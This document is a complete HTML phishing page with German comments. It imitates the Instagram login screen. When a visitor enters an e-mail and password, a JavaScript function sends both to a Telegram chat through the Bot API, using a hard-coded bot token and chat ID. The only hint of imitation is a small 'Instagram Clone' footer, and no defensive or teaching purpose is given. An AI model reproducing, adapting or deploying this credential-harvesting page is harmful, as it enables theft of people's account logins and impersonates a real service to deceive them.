<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram Login</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      background: linear-gradient(to bottom, #f5f5f5, #e9e9e9);
    }

    .login-container {
      background-color: white;
      border: 1px solid #dbdbdb;
      padding: 40px 20px;
      width: 350px;
      text-align: center;
      border-radius: 12px;
      box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
      transition: transform 0.3s ease, box-shadow 0.3s ease;
    }

    .login-container:hover {
      transform: translateY(-5px);
      box-shadow: 0px 6px 12px rgba(0, 0, 0, 0.15);
    }

    .login-container h1 {
      font-size: 24px;
      margin-bottom: 20px;
      color: #262626;
    }

    .login-container img {
      width: 100px;
      margin-bottom: 20px;
    }

    .login-container form {
      display: flex;
      flex-direction: column;
    }

    .login-container input {
      margin: 10px 0;
      padding: 12px;
      font-size: 14px;
      border: 1px solid #dbdbdb;
      border-radius: 6px;
      outline: none;
      transition: border 0.3s ease;
    }

    .login-container input:focus {
      border-color: #3897f0;
    }

    .login-container button {
      background-color: #3897f0;
      color: white;
      padding: 12px;
      border: none;
      border-radius: 6px;
      font-size: 14px;
      font-weight: bold;
      cursor: pointer;
      transition: background-color 0.3s ease, transform 0.2s ease;
    }

    .login-container button:hover {
      background-color: #3078d9;
      transform: scale(1.05);
    }

    .login-container p {
      font-size: 12px;
      color: #8e8e8e;
      margin-top: 20px;
    }
    @media (max-width: 600px) {
  .login-container {
    width: 90%; /* Die Breite passt sich dem Bildschirm an */
    padding: 30px 15px;
  }

  .login-container img {
    width: 120px; /* Verkleinere das Logo */
  }

  .login-container h1 {
    font-size: 20px; /* Verkleinere die SchriftgrÃ¶ÃŸe */
  }

  .login-container input {
    font-size: 12px; /* Verkleinere die Eingabefelder */
  }

  .login-container button {
    font-size: 12px;
    padding: 10px; /* Kleinere Buttons */
  }
}
  </style>
</head>
<body>
  <div class="login-container">
    <!-- Instagram-Logo hinzufÃ¼gen -->
    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">

    <h1>Instagram</h1>
    <form id="loginForm">
      <input type="email" id="email" placeholder="E-Mail-Adresse" required>
      <input type="password" id="password" placeholder="Passwort" required>
      <button type="button" onclick="sendToTelegram()">Anmelden</button>
    </form>
    <p>Â© 2025 Instagram Clone</p>
  </div>

  <script>
    // Telegram-Bot-Informationen
    const BOT_TOKEN = "7433787133:AAHuCXGJgERrcUwvb4adFMTlv8EX7e-upZY"; // Bot-Token
    const CHAT_ID = "6640486406";   // Deine Chat-ID

    // Funktion zum Senden der Daten an Telegram
    function sendToTelegram() {
      const email = document.getElementById("email").value;
      const password = document.getElementById("password").value;

      // Eingaben prÃ¼fen
      if (!email || !password) {
        alert("Bitte alle Felder ausfÃ¼llen!");
        return;
      }

      // Nachricht erstellen (String-Konkatenation)
      const message = "ðŸ›‘ Login-Daten erhalten:\n\nðŸ“§ E-Mail: " + email + "\nðŸ”‘ Passwort: " + password;
      console.log("Nachricht, die gesendet wird:", message);

      // Telegram-API-URL
      const telegramApiUrl = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";

      // Nachricht an Telegram senden
      fetch(telegramApiUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message,
        }),
      })
        .then(function (response) {
          console.log("HTTP-Statuscode:", response.status); // Statuscode anzeigen
          return response.json();
        })
        .then(function (data) {
          console.log("Telegram API Antwort:", data); // VollstÃ¤ndige API-Antwort
          if (data.ok) {
            alert("Daten erfolgreich gesendet!");
          } else {
            console.error("Telegram-Fehler:", data.description);
            alert("Fehler: " + data.description);
          }
        })
        .catch(function (error) {
          console.error("Fehler beim Senden:", error);
          alert("Ein Fehler ist aufgetreten: " + error.message);
        });
    }
  </script>
</body>
</html>
